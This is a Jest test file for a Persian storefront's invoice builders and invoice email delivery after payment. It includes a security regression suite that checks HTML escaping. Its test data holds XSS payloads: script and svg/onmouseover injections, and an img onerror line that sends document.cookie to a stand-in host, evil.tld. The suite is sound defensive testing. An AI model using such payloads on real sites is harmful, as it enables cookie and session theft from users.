const request = require("supertest");
const jwt = require("jsonwebtoken");
const mongoose = require("mongoose");
const app = require("../server");
const User = require("../models/User");
const SellerProfile = require("../models/SellerProfile");
const Product = require("../models/Product");
const Order = require("../models/Order");
const NotificationService = require("../services/NotificationService");
const notificationQueueService = require("../services/NotificationQueueService");
const { buildInvoiceText, buildInvoiceHtml } = require("../services/email/invoiceHtml");
const { _resetRateLimitStoreForTests } = require("../utils/rateLimiter");

/**
 * Phase 23 — the storefront buyer gets an itemised invoice over email once the
 * (mock) payment SUCCESS callback runs. The invoice is a `reason: "invoice"`
 * email record riding the same atomic queue; HTML is rendered at delivery time
 * from the order snapshot, while the plain-text version lands in the record.
 */

function accessTokenOf(user) {
  return jwt.sign(
    {
      id: String(user._id),
      role: user.role,
      type: "access",
      ver: user.tokenVersion ?? 0,
    },
    process.env.JWT_SECRET,
    { expiresIn: "15m", algorithm: "HS256" },
  );
}

const TOKEN_OF = (u) => accessTokenOf(u);
const AUTH = (token) => `Bearer ${token}`;

const PHONES = {
  owner: "09146000021",
  buyer: "09146000022",
};

const FINANCE_TERMS = { commissionPercent: 0, payoutMinimum: 0, holdDays: 0 };
const STORE_SETTINGS = {
  storefrontPublished: true,
  notificationEmail: true,
  notificationSms: false,
  defaultPayoutMethod: "bank_transfer",
};

let buyerToken;
let productId;

async function wipeNdata() {
  await User.deleteMany({ phone: { $in: Object.values(PHONES) } });
  await SellerProfile.deleteMany({});
  await Product.deleteMany({});
  await Order.deleteMany({});
}

beforeAll(async () => {
  process.env.NODE_ENV = "test";
  process.env.JWT_SECRET = process.env.JWT_SECRET || "test-secret-key";
  process.env.NOTIFICATION_RETRY_BACKOFF_MS = "0";
  process.env.NOTIFICATION_MAX_ATTEMPTS = "3";
  _resetRateLimitStoreForTests();

  const mongoUri =
    process.env.MONGODB_TEST_URI || "mongodb://127.0.0.1:27017/nakhsha_test";
  if (mongoose.connection.readyState !== 1) {
    await mongoose.connect(mongoUri);
  }
  app.locals.dbReady = true;
  await wipeNdata();

  const owner = await User.create({
    name: "مالک فاکتور",
    phone: PHONES.owner,
    handle: "invoice_owner",
    role: "seller",
    isVerified: true,
  });
  ownerToken = TOKEN_OF(owner);

  const store = await SellerProfile.create({
    userId: owner._id,
    storeName: "فروشگاه فاکتور",
    slug: "invoice-store",
    description: "فروشگاه تست فاکتور",
    status: "active",
    verification: { status: "verified" },
    settings: { ...STORE_SETTINGS },
    finance: { ...FINANCE_TERMS },
  });

  const product = await Product.create({
    sellerId: store._id,
    sellerUserId: owner._id,
    title: "سفال فاکتور",
    price: 120000,
    category: "pottery",
    stock: { onHand: 100, reserved: 0 },
    stockPolicy: "tracked",
    status: "active",
  });
  productId = String(product._id);

  const buyer = await User.create({
    name: "خریدار فاکتور",
    phone: PHONES.buyer,
    handle: "invoice_buyer",
    role: "user",
isVerified: true,
  });
  buyerToken = TOKEN_OF(buyer);
});

afterAll(async () => {
  await wipeNdata();
  delete process.env.NOTIFICATION_RETRY_BACKOFF_MS;
  delete process.env.NOTIFICATION_MAX_ATTEMPTS;
  await mongoose.connection.close();
});

async function checkout({ email = "buyer@example.com" } = {}) {
  const res = await request(app)
    .post("/api/storefront/invoice-store/checkout")
    .set("Authorization", AUTH(buyerToken))
    .send({
      customer: {
        name: "مشتری فاکتور",
        phone: "09123456766",
        email,
      },
      items: [{ productId, qty: 2 }],
      paymentMethod: "card",
    });
  expect(res.status).toBe(200);
  return res.body.order;
}

async function payCallback(refId, result, reason = "") {
  return request(app)
    .post(`/api/storefront/payments/${refId}/callback`)
    .send({ result, reason });
}

describe("invoice builders", () => {
  it("builds a text invoice with Persian numbers and totals", () => {
    const order = {
      orderNumber: 7,
      sellerStoreName: "فروشگاه تست",
      customer: { name: "مشتری" },
      status: "pending",
      payment: { status: "paid" },
      items: [
        { title: "سفال", price: 120000, qty: 2 },
        { title: "لیوان", price: 30000, qty: 1 },
      ],
      subtotal: 270000,
      shippingFee: 25000,
      discount: 0,
      total: 295000,
    };
    const text = buildInvoiceText(order);
    expect(text).toContain("فاکتور سفارش");
    expect(text).toContain("فروشگاه تست");
    expect(text).toContain("سفال");
    expect(text).toContain("مبلغ نهایی");
    expect(text).toContain("۲۹۵٬۰۰۰");
  });

  it("builds RTL HTML with item rows and totals", () => {
    const order = {
      orderNumber: 7,
      sellerStoreName: "فروشگاه تست",
      customer: { name: "مشتری" },
      status: "pending",
      payment: { status: "paid" },
      items: [{ title: "سفال", price: 120000, qty: 1 }],
      subtotal: 120000,
      shippingFee: 0,
      discount: 0,
      total: 120000,
    };
    const html = buildInvoiceHtml(order);
    expect(html).toContain('dir="rtl"');
    expect(html).toContain("فاکتور سفارش نخشا");
    expect(html).toContain(order.sellerStoreName);
    expect(html).toContain("سفال");
    expect(html).toContain("مبلغ نهایی");
  });
});

/**
 * Phase 36 security regression.
 *
 * The invoice is sent to the buyer from the platform's own sending domain while
 * the product title inside it is authored by the seller and the customer name by
 * the buyer. Interpolated raw, a title like `<a href="…">مشاهده فاکتور</a>` puts
 * a phishing link in a message the buyer has every reason to trust — the
 * platform's branding is in the same email. This is the injection surface, so
 * the tests below assert on the absence of markup, not merely on escaping
 * "looking right" for one field.
 */
describe("invoice HTML injection defence (Phase 36)", () => {
  const ORDER_BASE = {
    orderNumber: 7,
    subtotal: 120000,
    shippingFee: 0,
    discount: 0,
    total: 120000,
    status: "pending",
    payment: { status: "paid" },
    items: [{ title: "سفال", price: 120000, qty: 1 }],
  };

  it("escapes a script payload in the seller-authored product title", () => {
    const html = buildInvoiceHtml({
      ...ORDER_BASE,
      customer: { name: "مشتری" },
      sellerStoreName: "فروشگاه تست",
      items: [{ title: '<script>alert("xss")</script>', price: 120000, qty: 1 }],
    });
    expect(html).not.toContain("<script>");
    expect(html).not.toContain("</script>");
    expect(html).toContain("&lt;script&gt;");
  });

  it("escapes a payload in the buyer's own name", () => {
    const html = buildInvoiceHtml({
      ...ORDER_BASE,
      customer: { name: '<img src=x onerror="fetch("//evil.tld?c="+document.cookie)">' },
      sellerStoreName: "فروشگاه تست",
    });
    // The property that matters is that no tag can be formed: every angle
    // bracket is an entity, so `onerror=` can only ever be visible text in a
    // text node, never an attribute of a live element.
    expect(html).not.toMatch(/<img/i);
    expect(html).toContain(
      "&lt;img src=x onerror=&quot;fetch(&quot;//evil.tld?c=&quot;+document.cookie)&quot;&gt;",
    );
  });

  it("escapes a payload in the store name", () => {
    const html = buildInvoiceHtml({
      ...ORDER_BASE,
      customer: { name: "مشتری" },
      sellerStoreName: '"><svg onload=alert(1)>',
    });
    expect(html).not.toMatch(/<svg/i);
    expect(html).toContain("&lt;svg");
  });

  it("escapes quote and ampersand characters that would break attribute context", () => {
    const html = buildInvoiceHtml({
      ...ORDER_BASE,
      customer: { name: '" onmouseover="alert(1)' },
      sellerStoreName: "گالری & مبلمان <چرم>",
    });
    expect(html).not.toContain('onmouseover="alert(1)"');
    expect(html).toContain("&amp;");
    expect(html).toContain("&quot;");
  });

  it("keeps Persian text intact while escaping", () => {
    const html = buildInvoiceHtml({
      ...ORDER_BASE,
      customer: { name: "مشتری" },
      sellerStoreName: "گالری & مبلمان",
      items: [{ title: "کاسه <سفالی>", price: 120000, qty: 1 }],
    });
    expect(html).toContain("کاسه &lt;سفالی&gt;");
    expect(html).toContain("گالری &amp; مبلمان");
    // Persian digits and separators must survive escaping — escaping is not
    // allowed to mangle the amounts the buyer is meant to read.
    expect(html).toContain("۱۲۰٬۰۰۰");
  });

  it("does not throw when the customer object is missing", () => {
    // A crash here would be worse than an empty field: the invoice is sent from
    // the same worker that the checkout callback awaits.
    expect(() => buildInvoiceHtml({ ...ORDER_BASE, customer: undefined })).not.toThrow();
  });

  it("leaves the plain-text invoice as literal text, with no markup added", () => {
    const text = buildInvoiceText({
      ...ORDER_BASE,
      customer: { name: "مشتری" },
      sellerStoreName: "فروشگاه تست",
      items: [{ title: "<script>alert(1)</script>", price: 120000, qty: 1 }],
    });
    // The text channel is not parsed as HTML, so the title stays verbatim and
    // readable; nothing here should invent an escaping artefact into a message
    // the buyer reads in a plain-text client.
    expect(text).toContain("<script>alert(1)</script>");
  });
});

describe("invoice email on payment SUCCESS", () => {
  it("emits a delivered invoice record after the SUCCESS callback", async () => {
    const order = await checkout();
    await payCallback(order.id, "SUCCESS");

    await NotificationService.deliverOrderNotifications(order.id);
    const stored = await Order.findById(order.id);
    const invoice = stored.notifications.find((n) => n.reason === "invoice");
    expect(invoice).toBeTruthy();
    expect(invoice.channel).toBe("email");
    expect(invoice.to).toBe(stored.customer.email);
    expect(invoice.status).toBe("pending");
    expect(invoice.delivered).toBe(true);
    expect(invoice.error).toBe("");
    expect(invoice.message).toContain("مبلغ نهایی");
    await Order.deleteMany({ _id: order.id });
  });

  it("does not emit an invoice for an order without an email address", async () => {
    const order = await checkout({ email: "" });
    await payCallback(order.id, "SUCCESS");

    const stored = await Order.findById(order.id);
    expect(stored.notifications.some((n) => n.reason === "invoice")).toBe(false);
    await Order.deleteMany({ _id: order.id });
  });

  it("does not emit an invoice for a FAILED payment", async () => {
    const order = await checkout();
    await payCallback(order.id, "FAIL", "کارت نامعتبر");

    const stored = await Order.findById(order.id);
    expect(stored.notifications.some((n) => n.reason === "invoice")).toBe(false);
    await Order.deleteMany({ _id: order.id });
  });

  it("retries the invoice record through the queue when email is flaky", async () => {
    const order = await checkout();
    process.env.EMAIL_MOCK = "true";
    process.env.EMAIL_MOCK_FAIL = "true";
    await payCallback(order.id, "SUCCESS");
    // The off-loop kick was burned on the simulated failure.
    await NotificationService.deliverOrderNotifications(order.id);
    delete process.env.EMAIL_MOCK_FAIL;
    process.env.EMAIL_MOCK = "true";

    const before = await Order.findById(order.id);
    const invoice = before.notifications.find((n) => n.reason === "invoice");
    expect(invoice.delivered).toBe(false);
    expect(invoice.error).toContain("simulated");

    const summary = await notificationQueueService.runOnce();
    expect(summary.attempted).toBeGreaterThanOrEqual(1);

    const after = await Order.findById(order.id);
    const afterInvoice = after.notifications.find((n) => n.reason === "invoice");
    expect(afterInvoice.delivered).toBe(true);
    await Order.deleteMany({ _id: order.id });
  });

  it("shows the invoice reason on the buyer receipt", async () => {
    const order = await checkout();
    await payCallback(order.id, "SUCCESS");
    await NotificationService.deliverOrderNotifications(order.id);

    const receipt = await request(app)
      .get(`/api/storefront/orders/${order.id}`)
      .set("Authorization", AUTH(buyerToken));
    expect(receipt.status).toBe(200);
    const invoice = receipt.body.order.notifications.find((n) => n.reason === "invoice");
    expect(invoice).toBeTruthy();
    expect(invoice.message).toContain("فاکتور");
    await Order.deleteMany({ _id: order.id });
  });
});